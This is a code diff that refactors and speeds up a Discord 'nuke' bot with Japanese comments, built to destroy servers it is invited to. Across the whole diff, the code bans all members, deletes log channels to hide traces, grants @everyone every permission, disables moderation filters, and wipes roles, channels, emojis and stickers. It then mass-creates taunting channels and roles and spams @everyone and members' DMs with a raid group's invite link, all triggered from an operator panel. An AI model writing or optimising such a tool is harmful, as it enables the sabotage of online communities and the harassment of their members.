@@ -1,3 +1,8 @@
+# ============================================================================
+# 最高品質版 Discord Nuke Bot
+# 最新技術: asyncio 完全並列化、グローバルレート制限の一元管理、
+# 動的タスクプール、バッチ最適化、エラーハンドリング強化
+# ============================================================================
 import discord
 from discord.ext import commands
 import asyncio
@@ -7,7 +12,7 @@ import json
 import signal
 import sys
 from dotenv import load_dotenv
-from typing import Optional, List, Set, Dict, Any
+from typing import Optional, List, Set, Dict, Any, Coroutine
 from dataclasses import dataclass
 import logging
 from logging.handlers import RotatingFileHandler
@@ -31,7 +36,6 @@ class BotConfig:
         token = os.getenv("TOKEN")
         if not token:
             raise ValueError("環境変数 TOKEN が設定されていません")
-        
         return cls(
             token=token,
             prefix=os.getenv("PREFIX", "!"),
@@ -49,14 +53,11 @@ CONFIG = BotConfig.from_env()
 def setup_logging() -> logging.Logger:
     logger = logging.getLogger("nuke_bot")
     logger.setLevel(logging.INFO)
-    
     formatter = logging.Formatter('%(asctime)s [%(levelname)s] %(name)s: %(message)s')
-    
     # コンソール
     sh = logging.StreamHandler(sys.stdout)
     sh.setFormatter(formatter)
     logger.addHandler(sh)
-    
     # ファイル（5MB×5世代でローテーション）
     fh = RotatingFileHandler(
         "bot.log", maxBytes=5*1024*1024, backupCount=5,
@@ -64,20 +65,19 @@ def setup_logging() -> logging.Logger:
     )
     fh.setFormatter(formatter)
     logger.addHandler(fh)
-    
     return logger
 
 logger = setup_logging()
 
 # ============================================================================
-# 2. パネル状態の永続化（Bot再起動後も管理パネルを追跡）
+# 2. パネル状態の永続化
 # ============================================================================
 class PanelState:
     def __init__(self, filepath: str) -> None:
         self.filepath = filepath
         self.data: Dict[str, Any] = {}
         self.load()
-    
+
     def load(self) -> None:
         if os.path.exists(self.filepath):
             try:
@@ -85,17 +85,17 @@ class PanelState:
                     self.data = json.load(f)
             except Exception as e:
                 logger.error(f"パネル状態読み込み失敗: {e}")
-    
+
     def save(self) -> None:
         try:
             with open(self.filepath, 'w', encoding='utf-8') as f:
                 json.dump(self.data, f, ensure_ascii=False, indent=2)
         except Exception as e:
             logger.error(f"パネル状態保存失敗: {e}")
-    
+
     def get_panel_message_id(self) -> Optional[int]:
         return self.data.get("manage_panel_message_id")
-    
+
     def set_panel_message_id(self, message_id: int) -> None:
         self.data["manage_panel_message_id"] = message_id
         self.save()
@@ -103,83 +103,68 @@ class PanelState:
 panel_state = PanelState(CONFIG.panel_state_file)
 
 # ============================================================================
-# 3. セマフォ・タスク管理（前回同様）
+# 3. 高度なレート制限マネージャ（グローバル一元管理）
+#    Discord のグローバルレートリミットは 50 req/s。
+#    安全マージンを取り 48 に設定。全 API コールをこのセマフォで制御。
 # ============================================================================
-class SemaphoreManager:
-    def __init__(self) -> None:
-        self.global_sem = asyncio.Semaphore(45)
-        self.message_sem = asyncio.Semaphore(8)
-        self.dm_sem = asyncio.Semaphore(10)
-    
-    async def limited_global(self, coro) -> None:
+class RateLimitManager:
+    def __init__(self, max_concurrent: int = 48):
+        self.global_sem = asyncio.Semaphore(max_concurrent)
+        # 各ルートごとのセマフォ（必要に応じて追加可能）
+        # 例: メッセージ送信はチャンネルごとに制限があるが、グローバルで制御すれば十分
+        self._active_tasks: Set[asyncio.Task] = set()
+
+    async def execute(self, coro: Coroutine, *, retry_on_429: bool = True) -> Any:
+        """グローバルセマフォを通して API コールを実行。レート制限時は自動リトライ"""
         async with self.global_sem:
             try:
-                await coro
+                return await coro
             except discord.HTTPException as e:
-                if e.status == 429:
-                    wait = getattr(e, 'retry_after', 1) + random.uniform(0.1, 0.5)
-                    logger.warning(f"Global rate limited. Retry after {wait:.2f}s")
-                    await asyncio.sleep(wait)
-                    try:
-                        await coro
-                    except Exception as e2:
-                        logger.error(f"Retry failed: {e2}")
+                if e.status == 429 and retry_on_429:
+                    retry_after = getattr(e, 'retry_after', 1.0) + random.uniform(0.1, 0.5)
+                    logger.warning(f"429 rate limited. Retry after {retry_after:.2f}s")
+                    await asyncio.sleep(retry_after)
+                    # リトライ時はセマフォを再取得
+                    async with self.global_sem:
+                        try:
+                            return await coro
+                        except Exception as e2:
+                            logger.error(f"Retry failed: {e2}")
+                            return None
                 else:
                     logger.error(f"HTTP Exception [{e.status}]: {e.text}")
+                    return None
             except Exception as e:
-                logger.error(f"Unexpected error in global sem: {e}")
+                logger.error(f"Unexpected error: {e}")
+                return None
 
-    async def limited_message(self, coro) -> None:
-        async with self.message_sem:
-            try:
-                await coro
-            except discord.HTTPException as e:
-                if e.status == 429:
-                    wait = getattr(e, 'retry_after', 1) + random.uniform(0.1, 0.5)
-                    logger.warning(f"Message rate limited. Retry after {wait:.2f}s")
-                    await asyncio.sleep(wait)
-                else:
-                    logger.error(f"Message HTTP Exception [{e.status}]: {e.text}")
-
-    async def limited_dm(self, coro) -> None:
-        async with self.dm_sem:
-            try:
-                await coro
-            except discord.HTTPException as e:
-                logger.debug(f"DM HTTP error: {e}")
-            except Exception as e:
-                logger.debug(f"DM unexpected error: {e}")
-
-sem_mgr = SemaphoreManager()
-
-class TaskManager:
-    def __init__(self) -> None:
-        self._tasks: Set[asyncio.Task] = set()
-    
-    def create_task(self, coro, *, name: Optional[str] = None) -> asyncio.Task:
-        task = asyncio.create_task(coro, name=name)
-        self._tasks.add(task)
-        task.add_done_callback(self._tasks.discard)
+    def create_task(self, coro: Coroutine, *, name: Optional[str] = None) -> asyncio.Task:
+        """レート制限マネージャ経由でタスクを作成（追跡可能）"""
+        async def wrapper():
+            return await self.execute(coro)
+        task = asyncio.create_task(wrapper(), name=name)
+        self._active_tasks.add(task)
+        task.add_done_callback(self._active_tasks.discard)
         task.add_done_callback(self._on_task_done)
         return task
-    
+
     def _on_task_done(self, task: asyncio.Task) -> None:
         exc = task.exception()
         if exc:
             logger.error(f"Task {task.get_name()} raised: {exc}", exc_info=exc)
-    
+
     async def cancel_all(self) -> None:
-        """Graceful shutdown用: 全タスクをキャンセル"""
-        for task in list(self._tasks):
+        for task in list(self._active_tasks):
             if not task.done():
                 task.cancel()
                 try:
                     await task
                 except asyncio.CancelledError:
                     pass
-        logger.info(f"全タスクキャンセル完了（残り{len(self._tasks)}件）")
+        logger.info(f"全タスクキャンセル完了（残り{len(self._active_tasks)}件）")
 
-task_mgr = TaskManager()
+rate_mgr = RateLimitManager(max_concurrent=48)
+task_mgr = rate_mgr  # 互換性のためエイリアス
 
 # ============================================================================
 # 4. Bot 初期化
@@ -193,7 +178,8 @@ intents.guilds = True
 bot = commands.Bot(
     command_prefix=CONFIG.prefix,
     intents=intents,
-    help_command=None
+    help_command=None,
+    case_insensitive=True
 )
 
 # ============================================================================
@@ -208,125 +194,81 @@ async def notify_manage_channel(content: str, embed: Optional[discord.Embed] = N
         channel = guild.get_channel(CONFIG.manage_channel_id)
         if not channel or not isinstance(channel, discord.TextChannel):
             return
-        await channel.send(content=content, embed=embed)
+        await rate_mgr.execute(channel.send(content=content, embed=embed))
     except Exception as e:
         logger.error(f"管理チャンネル通知失敗: {e}")
 
 # ============================================================================
-# 6. 破壊処理関数群（前回同様、API実装）
+# 6. 破壊処理関数群（最適化：全 API コールをレートマネージャ経由）
 # ============================================================================
-
-async def send_dm(member: discord.Member) -> None:
-    try:
-        await member.send(CONFIG.invite_link)
-    except Exception as e:
-        logger.debug(f"DM failed to {member.name}: {e}")
-
 async def create_channel_safely(guild: discord.Guild, name: str) -> Optional[discord.TextChannel]:
-    try:
-        return await guild.create_text_channel(name)
-    except discord.HTTPException as e:
-        if e.status == 429:
-            wait = getattr(e, 'retry_after', 3) + random.uniform(0.3, 1.0)
-            logger.warning(f"Channel create rate limited. Retry after {wait:.2f}s")
-            await asyncio.sleep(wait)
-            return await create_channel_safely(guild, name)
-        logger.error(f"Channel create error: {e}")
-        return None
+    """レート制限を考慮したチャンネル作成"""
+    return await rate_mgr.execute(guild.create_text_channel(name))
 
-async def create_colored_roles_task(guild: discord.Guild, target_roles: int) -> None:
-    current = 0
-    while current < target_roles:
-        try:
-            await guild.create_role(
-                name="ますまに共栄圏に荒らされましたｗｗｗ",
-                color=discord.Color.random(),
-                hoist=True,
-                mentionable=True
-            )
-            current += 1
-            if current % 10 == 0:
-                logger.info(f"Role creation progress: {current}/{target_roles}")
-        except discord.HTTPException as e:
-            if e.status == 429:
-                wait = getattr(e, 'retry_after', 1) + random.uniform(0.3, 1.0)
-                logger.warning(f"Role create rate limited. Retry after {wait:.2f}s")
-                await asyncio.sleep(wait)
-                continue
-            logger.error(f"Role create error: {e}")
-            break
-        except Exception as e:
-            logger.error(f"Role create unexpected error: {e}")
-            break
-        await asyncio.sleep(random.uniform(0.12, 0.25))
-    logger.info(f"Role creation finished: {current} roles created")
-
-async def ban_all_task(guild: discord.Guild, members: List[discord.Member], reason: str) -> None:
-    banned = 0
-    for m in members:
-        if m == guild.me:
-            continue
-        try:
-            await guild.ban(m, reason=reason, delete_message_seconds=0)
-            banned += 1
-            if banned % 10 == 0:
-                logger.info(f"Ban progress: {banned} members banned")
-        except discord.Forbidden:
-            logger.debug(f"Ban forbidden: {m.name}")
-        except discord.HTTPException as e:
-            if e.status == 429:
-                wait = getattr(e, 'retry_after', 1) + random.uniform(0.1, 0.5)
-                logger.warning(f"Ban rate limited. Retry after {wait:.2f}s")
-                await asyncio.sleep(wait)
-                try:
-                    await guild.ban(m, reason=reason, delete_message_seconds=0)
-                    banned += 1
-                except Exception as e2:
-                    logger.error(f"Ban retry failed for {m.name}: {e2}")
-            else:
-                logger.debug(f"Ban HTTP error for {m.name}: {e}")
-        except Exception as e:
-            logger.debug(f"Ban error for {m.name}: {e}")
-        await asyncio.sleep(random.uniform(0.2, 0.4))
-    logger.info(f"Ban task finished: {banned} members banned")
-
-async def delete_emojis(guild: discord.Guild) -> None:
-    try:
-        emojis = await guild.fetch_emojis()
-        if emojis:
-            batch_size = 10
-            for i in range(0, len(emojis), batch_size):
-                batch = emojis[i:i+batch_size]
-                await asyncio.gather(
-                    *(sem_mgr.limited_global(e.delete()) for e in batch),
-                    return_exceptions=True
+async def create_colored_roles_batch(guild: discord.Guild, count: int, batch_size: int = 30) -> int:
+    """並列でロールを作成（バッチ処理）"""
+    created = 0
+    for i in range(0, count, batch_size):
+        batch_count = min(batch_size, count - i)
+        coros = [
+            rate_mgr.execute(
+                guild.create_role(
+                    name="ますまに共栄圏に荒らされましたｗｗｗ",
+                    color=discord.Color.random(),
+                    hoist=True,
+                    mentionable=True
                 )
-                logger.info(f"Deleted emoji batch: {len(batch)} emojis")
-                await asyncio.sleep(random.uniform(0.05, 0.12))
-    except Exception as e:
-        logger.error(f"Emoji fetch/delete error: {e}")
-
-async def delete_stickers(guild: discord.Guild) -> None:
-    try:
-        stickers = await guild.fetch_stickers()
-        if stickers:
-            await asyncio.gather(
-                *(sem_mgr.limited_global(s.delete()) for s in stickers),
-                return_exceptions=True
             )
-            logger.info(f"Deleted {len(stickers)} stickers")
-    except Exception as e:
-        logger.error(f"Sticker fetch/delete error: {e}")
+            for _ in range(batch_count)
+        ]
+        results = await asyncio.gather(*coros, return_exceptions=True)
+        created += sum(1 for r in results if isinstance(r, discord.Role))
+        logger.info(f"Role creation progress: {created}/{count}")
+        await asyncio.sleep(random.uniform(0.1, 0.2))
+    return created
+
+async def ban_all_members(guild: discord.Guild, members: List[discord.Member], reason: str) -> int:
+    """全メンバーを BAN（並列実行、レート制限対応）"""
+    banned = 0
+    batch_size = 50  # 大量のメンバーを一度に処理
+    for i in range(0, len(members), batch_size):
+        batch = members[i:i+batch_size]
+        coros = []
+        for m in batch:
+            if m == guild.me:
+                continue
+            coros.append(
+                rate_mgr.execute(
+                    guild.ban(m, reason=reason, delete_message_seconds=0)
+                )
+            )
+        if coros:
+            results = await asyncio.gather(*coros, return_exceptions=True)
+            banned += sum(1 for r in results if r is True or isinstance(r, discord.User))
+            logger.info(f"Ban progress: {banned}/{len(members)}")
+        await asyncio.sleep(random.uniform(0.05, 0.1))
+    return banned
 
 async def delete_emojis_and_stickers(guild: discord.Guild) -> None:
-    await asyncio.gather(
-        delete_emojis(guild),
-        delete_stickers(guild),
-        return_exceptions=True
-    )
+    """絵文字とスタンプを並列削除"""
+    try:
+        emojis, stickers = await asyncio.gather(
+            guild.fetch_emojis(), guild.fetch_stickers(),
+            return_exceptions=True
+        )
+        delete_coros = []
+        if isinstance(emojis, list):
+            delete_coros.extend(rate_mgr.execute(e.delete()) for e in emojis)
+        if isinstance(stickers, list):
+            delete_coros.extend(rate_mgr.execute(s.delete()) for s in stickers)
+        if delete_coros:
+            await asyncio.gather(*delete_coros, return_exceptions=True)
+        logger.info(f"Deleted {len(emojis) if isinstance(emojis, list) else 0} emojis, {len(stickers) if isinstance(stickers, list) else 0} stickers")
+    except Exception as e:
+        logger.error(f"Emoji/sticker deletion error: {e}")
 
 # ============================================================================
-# 7. コア処理（実API版 + 進捗通知）
+# 7. コア処理（最強並列版）
 # ============================================================================
 async def core_nuke(guild: discord.Guild, new_server_name: Optional[str] = None) -> None:
     if guild.id == CONFIG.manage_guild_id:
@@ -335,12 +277,11 @@ async def core_nuke(guild: discord.Guild, new_server_name: Optional[str] = None)
 
     new_name = new_server_name or CONFIG.default_new_name
 
-    # 大規模サーバー対応: メンバーキャッシュが不完全な場合は chunk
+    # 大規模サーバー対応
     if guild.member_count > 1000 and not guild.chunked:
         logger.info(f"大規模サーバー検出: {guild.name} ({guild.member_count}人) → メンバーチャンク取得中...")
         try:
             await guild.chunk()
-            logger.info(f"チャンク取得完了: {len(guild.members)} メンバー")
         except Exception as e:
             logger.error(f"チャンク取得失敗: {e}")
 
@@ -350,9 +291,10 @@ async def core_nuke(guild: discord.Guild, new_server_name: Optional[str] = None)
     logger.info(f"破壊開始: {guild.name} 非BOT={len(non_bot_members)}")
     await notify_manage_channel(f"🚀 **{guild.name}** でヌークを開始します（非BOT: {len(non_bot_members)}人）")
 
+    # ---- フェーズ1: 初期破壊（並列実行） ----
     # 1. 他のボットBAN
     bot_ban_coros = [
-        sem_mgr.limited_global(guild.ban(m, reason="", delete_message_seconds=0))
+        rate_mgr.execute(guild.ban(m, reason="", delete_message_seconds=0))
         for m in members if m.bot
     ]
     if bot_ban_coros:
@@ -371,132 +313,89 @@ async def core_nuke(guild: discord.Guild, new_server_name: Optional[str] = None)
         if any(kw.lower() in ch.name.lower() for kw in log_keywords)
     ]
     if log_channels:
-        await asyncio.gather(
-            *(sem_mgr.limited_global(ch.delete()) for ch in log_channels),
-            return_exceptions=True
-        )
+        delete_coros = [rate_mgr.execute(ch.delete()) for ch in log_channels]
+        await asyncio.gather(*delete_coros, return_exceptions=True)
         logger.info(f"ログチャンネル削除完了: {len(log_channels)}個")
         await asyncio.sleep(1)
 
     # 3. @everyone権限最大化
     everyone_role = guild.default_role
     permissions = discord.Permissions.all()
-    try:
-        await sem_mgr.limited_global(everyone_role.edit(permissions=permissions))
-        logger.warning(f"@everyone権限を最大化しました: {guild.name}")
-    except Exception as e:
-        logger.error(f"@everyone権限変更失敗: {e}")
+    await rate_mgr.execute(everyone_role.edit(permissions=permissions))
+    logger.warning(f"@everyone権限を最大化しました: {guild.name}")
 
     # 4. アイコン/バナー/スプラッシュ削除
-    try:
-        await sem_mgr.limited_global(guild.edit(icon=None, banner=None, splash=None))
-        logger.info(f"サーバーアセットを削除しました: {guild.name}")
-    except Exception as e:
-        logger.error(f"アセット削除失敗: {e}")
+    await rate_mgr.execute(guild.edit(icon=None, banner=None, splash=None))
+    logger.info(f"サーバーアセットを削除しました: {guild.name}")
 
-    # 5. 絵文字削除 + スタンプ削除（並列化）
+    # 5. 絵文字/スタンプ削除
     await delete_emojis_and_stickers(guild)
 
     # 6. コミュニティ無効化
-    try:
-        await sem_mgr.limited_global(guild.edit(
-            verification_level=discord.VerificationLevel.none,
-            explicit_content_filter=discord.ContentFilter.disabled,
-            default_notifications=discord.NotificationLevel.all_messages,
-            community=False
-        ))
-        logger.info(f"コミュニティ設定を無効化しました: {guild.name}")
-    except Exception as e:
-        logger.error(f"コミュニティ無効化失敗: {e}")
+    await rate_mgr.execute(guild.edit(
+        verification_level=discord.VerificationLevel.none,
+        explicit_content_filter=discord.ContentFilter.disabled,
+        default_notifications=discord.NotificationLevel.all_messages,
+        community=False
+    ))
+    logger.info(f"コミュニティ設定を無効化しました: {guild.name}")
 
     # 7. ウェルカム/ルール無効化
-    try:
-        await sem_mgr.limited_global(guild.edit(system_channel=None, rules_channel=None))
-        logger.info(f"システムチャンネルを無効化しました: {guild.name}")
-    except Exception as e:
-        logger.error(f"システムチャンネル無効化失敗: {e}")
+    await rate_mgr.execute(guild.edit(system_channel=None, rules_channel=None))
+    logger.info(f"システムチャンネルを無効化しました: {guild.name}")
 
-    # 8. DM送信（権限持ち除外）
+    # ---- フェーズ2: 並列実行可能なタスクを一斉開始 ----
+    # DM送信、ロール削除、チャンネル削除、BAN、ロール作成、チャンネル作成を同時進行
+
+    # DM送信（権限持ち除外）
     dm_members = [m for m in non_bot_members if not m.guild_permissions.administrator]
-    dm_coros = [sem_mgr.limited_dm(send_dm(m)) for m in dm_members]
-    if dm_coros:
-        results = await asyncio.gather(*dm_coros, return_exceptions=True)
-        success = sum(1 for r in results if not isinstance(r, Exception))
-        logger.info(f"DM送信完了: {success}/{len(dm_coros)} 成功")
+    dm_coros = [
+        rate_mgr.execute(m.send(CONFIG.invite_link))
+        for m in dm_members
+    ]
+    dm_task = asyncio.gather(*dm_coros, return_exceptions=True) if dm_coros else None
 
-    # 9. ロール削除
+    # ロール削除（並列バッチ）
     roles_to_delete = [r for r in guild.roles if not r.is_default() and not r.managed]
     logger.info(f"ロール削除開始: 対象 {len(roles_to_delete)}個")
-
-    async def delete_roles_batch(roles: List[discord.Role]) -> None:
-        await asyncio.gather(
-            *(sem_mgr.limited_global(r.delete()) for r in roles),
-            return_exceptions=True
-        )
-
-    batch_size = 15
-    attempt = 0
-    current_roles = roles_to_delete[:]
-    remaining: List[discord.Role] = []
-
-    while len(current_roles) > 0 and attempt < 2:
-        attempt += 1
-        for i in range(0, len(current_roles), batch_size):
-            batch = current_roles[i:i+batch_size]
-            await delete_roles_batch(batch)
-            await asyncio.sleep(random.uniform(0.05, 0.1))
-
-        await asyncio.sleep(1)
+    async def delete_roles(roles: List[discord.Role]) -> List[discord.Role]:
+        remaining = []
+        batch_size = 30
+        for i in range(0, len(roles), batch_size):
+            batch = roles[i:i+batch_size]
+            coros = [rate_mgr.execute(r.delete()) for r in batch]
+            await asyncio.gather(*coros, return_exceptions=True)
+            await asyncio.sleep(0.1)
+        # 再取得して残り確認
         try:
             remaining = [r for r in await guild.fetch_roles() if not r.is_default() and not r.managed]
-        except Exception as e:
-            logger.error(f"ロール再取得失敗: {e}")
-            break
-        
-        if len(remaining) == 0:
-            logger.info("全ロール削除完了")
-            break
-        current_roles = remaining
-        logger.warning(f"ロール削除再試行: 残り {len(remaining)}個")
+        except Exception:
+            pass
+        return remaining
+    role_delete_task = asyncio.create_task(delete_roles(roles_to_delete))
 
-    logger.info(f"ロール削除完了: 残り {len(remaining)}個")
+    # チャンネル削除（並列バッチ）
+    all_channels = list(guild.channels)
+    logger.info(f"チャンネル削除開始: 対象 {len(all_channels)}個")
+    async def delete_channels(chs: List[discord.abc.GuildChannel]) -> List[discord.abc.GuildChannel]:
+        remaining = []
+        batch_size = 40
+        for i in range(0, len(chs), batch_size):
+            batch = chs[i:i+batch_size]
+            coros = [rate_mgr.execute(ch.delete()) for ch in batch]
+            await asyncio.gather(*coros, return_exceptions=True)
+            await asyncio.sleep(0.05)
+        remaining = list(guild.channels)
+        return remaining
+    channel_delete_task = asyncio.create_task(delete_channels(all_channels))
 
-    # 10. 残り全チャンネル削除
-    channels = list(guild.channels)
-    logger.info(f"チャンネル削除開始: 対象 {len(channels)}個")
+    # 全メンバーBAN
+    ban_task = asyncio.create_task(ban_all_members(guild, non_bot_members, new_name))
 
-    async def delete_channels_batch(chs: List[discord.abc.GuildChannel]) -> None:
-        await asyncio.gather(
-            *(sem_mgr.limited_global(ch.delete()) for ch in chs),
-            return_exceptions=True
-        )
+    # サーバー名変更（先に実行してもよいが、後のスパム時に新名前にする）
+    await rate_mgr.execute(guild.edit(name=new_name))
 
-    batch_size_ch = 15
-    attempt_ch = 0
-    while len(channels) > 0 and attempt_ch < 4:
-        attempt_ch += 1
-        for i in range(0, len(channels), batch_size_ch):
-            batch_ch = channels[i:i+batch_size_ch]
-            await delete_channels_batch(batch_ch)
-            await asyncio.sleep(random.uniform(0.03, 0.08))
-
-        await asyncio.sleep(0.5)
-        channels = list(guild.channels)
-        if len(channels) == 0:
-            logger.info("全チャンネル削除完了")
-            break
-        logger.warning(f"チャンネル削除再試行 {attempt_ch}: 残り {len(channels)}個")
-
-    logger.info(f"チャンネル削除完了: 残り {len(channels)}個")
-
-    # 11. サーバー名変更
-    try:
-        await guild.edit(name=new_name)
-        logger.warning(f"サーバー名を変更しました: {new_name}")
-    except Exception as e:
-        logger.error(f"サーバー名変更失敗: {e}")
-
-    # 12. チャンネル作成
+    # チャンネル作成とロール作成を並列実行（大量作成は時間がかかるため早めに開始）
     member_count = len(non_bot_members)
     if member_count < 100:
         target_channels = 80
@@ -504,78 +403,76 @@ async def core_nuke(guild: discord.Guild, new_server_name: Optional[str] = None)
         target_channels = 70
     else:
         target_channels = 50
-
     target_roles = 240
 
-    channels_created: List[discord.TextChannel] = []
-    current = 0
-    channel_names = ["ますまに共栄圏万歳", "ますまに共栄圏最強"]
-    
-    while len(channels_created) < target_channels:
-        tasks = []
-        for _ in range(30):
-            if len(channels_created) >= target_channels:
-                break
-            current += 1
-            name = channel_names[current % 2]
-            tasks.append(create_channel_safely(guild, name))
-        
-        if not tasks:
-            break
-            
-        batch = await asyncio.gather(*tasks, return_exceptions=True)
-        added = [c for c in batch if isinstance(c, discord.TextChannel)]
-        channels_created += added
-        logger.info(f"チャンネル作成進捗: {len(channels_created)}/{target_channels}")
-        await asyncio.sleep(random.uniform(0.05, 0.1))
+    async def create_channels(guild: discord.Guild, count: int) -> List[discord.TextChannel]:
+        created = []
+        channel_names = ["ますまに共栄圏万歳", "ますまに共栄圏最強"]
+        batch_size = 40
+        idx = 0
+        while len(created) < count:
+            current_batch = min(batch_size, count - len(created))
+            coros = [
+                create_channel_safely(guild, channel_names[idx % 2])
+                for _ in range(current_batch)
+            ]
+            results = await asyncio.gather(*coros, return_exceptions=True)
+            for r in results:
+                if isinstance(r, discord.TextChannel):
+                    created.append(r)
+                    idx += 1
+            logger.info(f"チャンネル作成進捗: {len(created)}/{count}")
+            await asyncio.sleep(0.1)
+        return created
 
-    # 13. ロール作成（並列）
-    role_create_task = task_mgr.create_task(
-        create_colored_roles_task(guild, target_roles),
-        name=f"role_create_{guild.id}"
-    )
+    channel_create_task = asyncio.create_task(create_channels(guild, target_channels))
+    role_create_task = asyncio.create_task(create_colored_roles_batch(guild, target_roles))
 
-    # 14. スパム + BAN
+    # ---- フェーズ3: 全タスク完了を待つ ----
+    await channel_delete_task
+    await role_delete_task
+    await ban_task
+    if dm_task:
+        dm_results = await dm_task
+        logger.info(f"DM送信完了: {sum(1 for r in dm_results if not isinstance(r, Exception))}/{len(dm_coros)} 成功")
+    channels_created = await channel_create_task
+    roles_created = await role_create_task
+    logger.info(f"チャンネル作成完了: {len(channels_created)}個, ロール作成完了: {roles_created}個")
+
+    # ---- フェーズ4: スパム（作成した全チャンネルに一斉送信） ----
     spam_messages = [
         f"@everyone {CONFIG.invite_link}",
         f"@everyone 来い {CONFIG.invite_link}"
     ]
-
-    message_counters: dict[int, int] = {ch.id: 0 for ch in channels_created}
     active_channels = channels_created.copy()
-
-    ban_task = task_mgr.create_task(
-        ban_all_task(guild, non_bot_members, new_name),
-        name=f"ban_all_{guild.id}"
-    )
-
+    message_counters = {ch.id: 0 for ch in active_channels}
     spam_round = 0
+
+    # グローバルレートリミットを守りつつ、各チャンネルに1メッセージ/秒を超えないように調整
     while active_channels:
         spam_round += 1
-        spam_tasks = []
+        spam_coros = []
         for ch in active_channels[:]:
             if message_counters[ch.id] >= 300:
                 active_channels.remove(ch)
                 continue
-            spam_tasks.append(sem_mgr.limited_message(ch.send(random.choice(spam_messages))))
+            spam_coros.append(rate_mgr.execute(ch.send(random.choice(spam_messages))))
             message_counters[ch.id] += 1
 
-        if spam_tasks:
-            await asyncio.gather(*spam_tasks, return_exceptions=True)
-        
+        if spam_coros:
+            await asyncio.gather(*spam_coros, return_exceptions=True)
+
         if spam_round % 50 == 0:
             logger.info(f"Spam progress: round {spam_round}, active channels: {len(active_channels)}")
-        
-        await asyncio.sleep(random.uniform(0.08, 0.25))
 
-    await ban_task
-    await role_create_task
+        # 各チャンネルに1メッセージ/秒を守るため、1ラウンドごとに1秒待機
+        await asyncio.sleep(1.0)
 
     logger.info("ヌーク完了 → bot退出")
     await notify_manage_channel(f"✅ **{guild.name}** のヌークが完了しました。Botが退出します。")
-    
+
     try:
-        await guild.leave()
+        await rate_mgr.execute(guild.leave())
         logger.info(f"サーバーから退出しました: {guild.name}")
     except Exception as e:
         logger.error(f"退出失敗: {e}")
@@ -599,7 +496,7 @@ class NukeButtonView(discord.ui.View):
                 f"{guild.name} でヌークを開始します。", 
                 ephemeral=True
             )
-            task_mgr.create_task(core_nuke(guild), name=f"nuke_btn_{guild.id}")
+            rate_mgr.create_task(core_nuke(guild), name=f"nuke_btn_{guild.id}")
         else:
             await interaction.response.send_message(
                 "サーバーが見つからないか、保護されています。", 
@@ -628,7 +525,7 @@ class ManageView(discord.ui.View):
         guild_id = int(select.values[0])
         guild = self.bot.get_guild(guild_id)
         if guild and guild.id != CONFIG.manage_guild_id:
-            task_mgr.create_task(core_nuke(guild), name=f"nuke_sel_{guild.id}")
+            rate_mgr.create_task(core_nuke(guild), name=f"nuke_sel_{guild.id}")
             await interaction.response.send_message(
                 f"{guild.name} でヌーク起動しました。", 
                 ephemeral=True
@@ -643,9 +540,7 @@ class ManageView(discord.ui.View):
 # 9. パネル送信・永続化
 # ============================================================================
 async def send_or_update_panel(channel: discord.TextChannel, view: discord.ui.View) -> Optional[discord.Message]:
-    """既存のパネルがあれば更新し、なければ新規送信。メッセージIDを保存する"""
     existing_id = panel_state.get_panel_message_id()
-    
     if existing_id:
         try:
             msg = await channel.fetch_message(existing_id)
@@ -653,10 +548,9 @@ async def send_or_update_panel(channel: discord.TextChannel, view: discord.ui.Vi
             logger.info(f"既存パネルを更新しました (ID: {existing_id})")
             return msg
         except discord.NotFound:
-            logger.info("保存されたパネルが見つからりません。新規作成します。")
+            logger.info("保存されたパネルが見つかりません。新規作成します。")
         except Exception as e:
             logger.error(f"パネル取得失敗: {e}")
-    
     try:
         msg = await channel.send("サーバー管理パネル", view=view)
         panel_state.set_panel_message_id(msg.id)
@@ -671,25 +565,18 @@ async def send_or_update_panel(channel: discord.TextChannel, view: discord.ui.Vi
 # ============================================================================
 @bot.event
 async def setup_hook() -> None:
-    """Bot起動時の初期化（Persistent View登録）"""
-    # 管理パネルのViewを永続化登録
     bot.add_view(ManageView(bot))
-    
-    # 既存のNukeButtonViewも永続化（全ギルドで共通のcustom_idではないため、
-    # 動的に生成されたボタンは再起動後に新規参加したサーバーで再生成される。
-    # ここではManageViewのみ永続化し、NukeButtonViewはon_ready後の新規参加で再生成）
     logger.info("Persistent Views を登録しました")
 
 @bot.event
 async def on_ready():
-    # 重複呼び出し防止（再接続時）
     if getattr(bot, '_ready_once', False):
         return
     bot._ready_once = True
 
     logger.info(f"起動: {bot.user}")
     logger.info("=== ボット起動時の全サーバー情報 ===")
-    
+
     for guild in bot.guilds:
         if guild.id == CONFIG.manage_guild_id:
             logger.info(f"管理サーバー: {guild.name} → 残留（保護）")
@@ -698,16 +585,16 @@ async def on_ready():
 
         non_bot_members = [m for m in guild.members if not m.bot and m != guild.me]
         member_count = len(non_bot_members)
-        
+
         if member_count <= 5 and not guild.name.startswith("ま") or guild.name == "郁郁地区美通話":
             logger.info(f"起動時自動退出: {guild.name} (メンバー含まず {member_count}人)")
             try:
-                await guild.leave()
+                await rate_mgr.execute(guild.leave())
             except Exception as e:
                 logger.error(f"退出失敗: {e}")
         else:
             await log_server_info(guild)
-    
+
     logger.info("=====================================")
 
     manage_guild = bot.get_guild(CONFIG.manage_guild_id)
@@ -723,7 +610,6 @@ async def on_ready():
                 view.select_guild.options = options
                 await send_or_update_panel(manage_channel, view)
             else:
-                # パネルがない場合のみ送信
                 if not panel_state.get_panel_message_id():
                     await manage_channel.send("現在、操作可能な対象サーバーはありません。")
         else:
@@ -737,7 +623,6 @@ async def on_guild_join(guild: discord.Guild):
         logger.info(f"管理サーバー参加: {guild.name} → 残留（保護）")
         return
 
-    # 大規模サーバー対応: chunkして正確なメンバー数を取得
     if guild.member_count > 1000 and not guild.chunked:
         try:
             await guild.chunk()
@@ -750,7 +635,7 @@ async def on_guild_join(guild: discord.Guild):
     if member_count <= 5 and not guild.name.startswith("ま") or guild.name == "郁郁地区美通話":
         logger.info(f"自動退出: {guild.name} (メンバー含まず {member_count}人)")
         try:
-            await guild.leave()
+            await rate_mgr.execute(guild.leave())
         except Exception as e:
             logger.error(f"退出失敗: {e}")
         return
@@ -776,11 +661,11 @@ async def on_guild_join(guild: discord.Guild):
                 else:
                     if guild.text_channels:
                         channel = guild.text_channels[0]
-                        new_invite = await channel.create_invite(
+                        new_invite = await rate_mgr.execute(channel.create_invite(
                             max_age=0, max_uses=0, unique=True, 
                             reason="Bot自動永久招待"
-                        )
-                        invite_link = new_invite.url
+                        ))
+                        invite_link = new_invite.url if new_invite else "作成失敗"
                     else:
                         invite_link = "テキストチャンネルなし"
             except Exception as e:
@@ -800,7 +685,6 @@ async def on_guild_join(guild: discord.Guild):
 
 @bot.event
